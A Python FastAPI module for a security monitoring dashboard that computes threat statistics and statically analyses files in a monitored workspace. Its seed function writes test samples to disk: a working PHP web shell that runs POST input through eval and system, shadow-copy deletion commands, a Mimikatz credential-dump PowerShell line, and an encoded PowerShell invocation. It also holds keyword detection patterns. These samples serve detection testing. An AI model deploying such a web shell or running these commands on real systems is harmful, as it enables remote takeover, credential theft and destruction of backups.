"""
ragsec.backend.api.dashboard_routes
API Endpoints for Live Dashboard Statistics, 10-Category Taxonomy, and Real Workspace File Inspection.
"""
from fastapi import APIRouter, HTTPException
import os
import hashlib
import json
from typing import List, Dict, Any, Optional

from db.database import get_all_records
from analysis.static_analyzer import run_static_analysis
from analysis.file_classifier import classify_file

router = APIRouter(prefix="/api/dashboard", tags=["dashboard"])

ALL_CATEGORIES = [
    "Malware",
    "Ransomware",
    "Trojan",
    "Worm",
    "Spyware",
    "Rootkit",
    "Phishing / Credential Theft",
    "Suspicious Script / Execution",
    "Persistence / Privilege Abuse",
    "Data Theft / Exfiltration",
    "BENIGN",
    "UNKNOWN"
]

from config import get_canonical_workspace_dir

def get_workspace_dir() -> str:
    ws_dir = get_canonical_workspace_dir()
    os.makedirs(os.path.join(ws_dir, ".quarantine"), exist_ok=True)
    return ws_dir


def ensure_seed_workspace_files(ws_dir: str):
    """
    Ensures standard baseline inspection files exist in monitored_workspace
    so the analyst always has live files on disk to inspect and test.
    """
    sample_files = {
        "malware_simulation.exe": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode.\r\r\n$VirtualAlloc CreateRemoteThread WriteProcessMemory cmd.exe /c powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
        "ransomware_simulation.txt": b"WARNING: All your enterprise files have been encrypted using AES-256 and RSA-4096.\nCommand executed: vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\nDo not restart your computer or attempt recovery.\nContact key recovery: blacksuit_decryptor@onion.mail",
        "suspicious_script.ps1": b"# Advanced reconnaissance and privilege escalation script\n$encoded = 'Get-WmiObject Win32_UserAccount; Invoke-Mimikatz -DumpCreds'\n$bytes = [System.Convert]::FromBase64String('R2V0LVdtaU9iamVjdCBXaW4zMl9Vc2VyQWNjb3VudA==')\n$cmd = [System.Text.Encoding]::Unicode.GetString($bytes)\nInvoke-Expression $cmd",
        "web_backdoor.php": b"<?php\n// Simple obfuscated web shell\nif(isset($_POST['cmd'])){\n  $cmd = $_POST['cmd'];\n  eval(base64_decode($cmd));\n  system($cmd);\n  passthru($cmd);\n}\n?>",
        "system_config.json": b"{\n  \"environment\": \"production\",\n  \"node_id\": \"FIN-WS-042\",\n  \"policy_version\": \"2026.09.1\",\n  \"status\": \"healthy\",\n  \"compliance_mode\": \"ENFORCED\"\n}",
        "normal_document.txt": b"Enterprise Security Standard Operating Procedure (SOP-042).\nAll endpoint logs must be forwarded to the centralized SIEM.\nAudit records are retained for 365 days in accordance with ISO 27001 standard."
    }

    for fname, content in sample_files.items():
        fpath = os.path.join(ws_dir, fname)
        if not os.path.exists(fpath):
            try:
                with open(fpath, "wb") as f:
                    f.write(content)
            except Exception:
                pass


@router.get("/stats")
def get_dashboard_stats():
    """
    Computes real-time live statistics across all SQLite tables (events, file_analyses, incidents)
    synchronized with physical on-disk files in monitored_workspace/ and the .quarantine enclave.
    """
    events = get_all_records("events")
    analyses = get_all_records("file_analyses")
    incidents = get_all_records("incidents")
    workspace_dir = get_workspace_dir()
    quarantine_dir = os.path.join(workspace_dir, ".quarantine")

    # 1. Gather all quarantined items in enclave
    quarantined_count = 0
    if os.path.exists(quarantine_dir):
        quarantined_count = len([f for f in os.listdir(quarantine_dir) if os.path.isfile(os.path.join(quarantine_dir, f))])

    # 2. Map known file analyses for fast lookup
    analyses_by_name = {}
    for a in analyses:
        if isinstance(a, dict) and a.get("filename"):
            analyses_by_name[a["filename"].lower()] = a

    # 3. Scan physical disk files in monitored_workspace (strictly excluding .quarantine and .git)
    active_threat_files = set()
    clean_files_on_disk = 0
    for root, dirs, files in os.walk(workspace_dir):
        if ".quarantine" in root or ".git" in root or "replication_sandbox" in root:
            continue
        for f in files:
            f_lower = f.lower()
            rec = analyses_by_name.get(f_lower)
            is_threat = False
            if rec:
                is_threat = rec.get("threat_state") in ["THREAT", "SUSPICIOUS"] or rec.get("risk_score", 0) > 50
            else:
                is_threat = any(kw in f_lower for kw in ["malware", "ransomware", "backdoor", "trojan", "suspicious", "exploit"])
            
            if is_threat:
                active_threat_files.add(f)
            else:
                clean_files_on_disk += 1

    active_threat_count = len(active_threat_files)
    monitored_events = len(events)

    taxonomy_counts = {cat: 0 for cat in ALL_CATEGORIES}
    historical_threat_count = 0
    benign_count = 0
    unknown_count = 0

    # Aggregate historical taxonomy from events
    for e in events:
        if not isinstance(e, dict):
            continue
        c = e.get("canonical") or {}
        cat = c.get("category") or e.get("category") or "BENIGN"
        status = c.get("threat_status") or e.get("threat_status")
        
        # Normalize category name
        matched_cat = "BENIGN"
        for ac in ALL_CATEGORIES:
            if ac.lower() == cat.lower() or cat.lower() in ac.lower():
                matched_cat = ac
                break
        
        taxonomy_counts[matched_cat] += 1

        if status == "THREAT" or e.get("is_suspicious") is True or c.get("risk_score", 0) > 50:
            historical_threat_count += 1
        elif matched_cat == "BENIGN":
            benign_count += 1
        elif matched_cat == "UNKNOWN":
            unknown_count += 1

    return {
        # Field names that match frontend expectations
        "threat_index": "ACTIVE" if active_threat_count > 0 else "NORMAL",
        "threat_index_active": active_threat_count,
        "threat_count": active_threat_count,
        "quarantined_count": quarantined_count,
        "historical_threat_count": historical_threat_count,
        "monitored_events_count": monitored_events,
        "monitored_events": monitored_events,
        "benign_count": max(clean_files_on_disk, benign_count),
        "unknown_count": unknown_count,
        "active_incidents_count": len(incidents),
        "taxonomy_counts": taxonomy_counts
    }


@router.get("/workspace-files")
def get_workspace_files():
    """
    Scans physical on-disk files in monitored_workspace/ and performs safe static analysis on each.
    Returns live metadata, file hashes, size, text preview, defensive indicators, CRUD operation history,
    and clear safe/unsafe verdicts with quarantine and deletion capabilities.
    """
    import datetime
    ws_dir = get_workspace_dir()
    ensure_seed_workspace_files(ws_dir)

    events = get_all_records("events")

    results = []
    try:
        filenames = [f for f in os.listdir(ws_dir) if not f.startswith(".") and os.path.isfile(os.path.join(ws_dir, f))]
    except Exception:
        filenames = []

    for fname in filenames:
        fpath = os.path.join(ws_dir, fname)
        try:
            stat = os.stat(fpath)
            size_bytes = stat.st_size
            created_at = datetime.datetime.fromtimestamp(stat.st_ctime, datetime.UTC).isoformat()
            modified_at = datetime.datetime.fromtimestamp(stat.st_mtime, datetime.UTC).isoformat()

            with open(fpath, "rb") as f:
                content_bytes = f.read(512 * 1024)  # Read up to 512KB for inspection
            
            sha256_hash = hashlib.sha256(content_bytes).hexdigest()
            
            # Safe static analysis (deterministic, zero LLM block)
            static_res = run_static_analysis(fname, content_bytes)
            classification_res = classify_file(fname, content_bytes, static_res, data_source="live", use_ai=False)

            # Try decoding text preview
            try:
                content_text = content_bytes.decode("utf-8", errors="replace")
            except Exception:
                content_text = f"[Binary File - {size_bytes:,} bytes - SHA256: {sha256_hash}]"

            # Parse defensive indicators from static signals
            signals = [s.label.lower() for s in static_res.signals]
            defensive_indicators = {
                "persistence_mechanisms": any("run" in s or "service" in s or "schtasks" in s or "persist" in s for s in signals),
                "credential_access": any("mimikatz" in s or "cred" in s or "password" in s or "wmi" in s for s in signals),
                "obfuscated_code": any("base64" in s or "eval" in s or "obfusc" in s or "high entropy" in s for s in signals),
                "network_comms": any("http" in s or "ip" in s or "c2" in s or "url" in s or "connect" in s for s in signals),
                "destructive_file_ops": any("vssadmin" in s or "encrypt" in s or "shadow" in s or "delete" in s for s in signals),
                "suspicious_process_exec": any("powershell" in s or "cmd.exe" in s or "spawn" in s or "createprocess" in s or "system(" in s for s in signals)
            }

            # Gather CRUD operations history for this file from events table
            file_ops = []
            for ev in events:
                if not isinstance(ev, dict):
                    continue
                c = ev.get("canonical") or {}
                evt_fp = (c.get("file_path") or "").lower()
                evt_fn = os.path.basename(evt_fp) if evt_fp else ""
                if evt_fn.lower() == fname.lower() or fname.lower() in evt_fp:
                    file_ops.append({
                        "event_id": ev.get("id"),
                        "action": (c.get("action") or ev.get("event_type") or "ACCESSED").upper(),
                        "timestamp": ev.get("timestamp") or modified_at,
                        "process": ev.get("process_name") or "fim_watcher",
                        "threat_status": c.get("threat_status") or ("THREAT" if ev.get("is_suspicious") else "SAFE")
                    })

            if not file_ops:
                file_ops.append({
                    "event_id": f"init-{fname}",
                    "action": "CREATED",
                    "timestamp": created_at,
                    "process": "filesystem",
                    "threat_status": classification_res.threat_state
                })

            file_ops.sort(key=lambda x: str(x.get("timestamp") or ""), reverse=True)

            is_safe = classification_res.threat_state in ["SAFE", "BENIGN"] and int(classification_res.risk_score) <= 30

            results.append({
                "id": f"art-{sha256_hash[:8]}",
                "file_name": fname,
                "file_path": f"monitored_workspace/{fname}",
                "size_bytes": size_bytes,
                "created_at": created_at,
                "modified_at": modified_at,
                "sha256_hash": sha256_hash,
                "threat_status": classification_res.threat_state,
                "is_safe": is_safe,
                "category": classification_res.classification,
                "severity": classification_res.severity.upper(),
                "confidence": int(classification_res.risk_score),
                "risk_score": int(classification_res.risk_score),
                "reasons": [classification_res.rationale] if isinstance(classification_res.rationale, str) else classification_res.rationale[:3],
                "evidence": [s.label for s in static_res.signals[:4]],
                "content": content_text,
                "defensive_indicators": defensive_indicators,
                "crud_operations": file_ops,
                "can_quarantine": True,
                "can_delete": True,
                "event_type": file_ops[0]["action"] if file_ops else "CREATED",
                "process_name": "cmd.exe" if fname.endswith(".exe") else "powershell.exe" if fname.endswith(".ps1") else "php-fpm" if fname.endswith(".php") else "system",
                "user": "NT AUTHORITY\\SYSTEM" if classification_res.threat_state == "THREAT" else "analyst"
            })
        except Exception:
            continue

    return {"files": results, "total": len(results)}
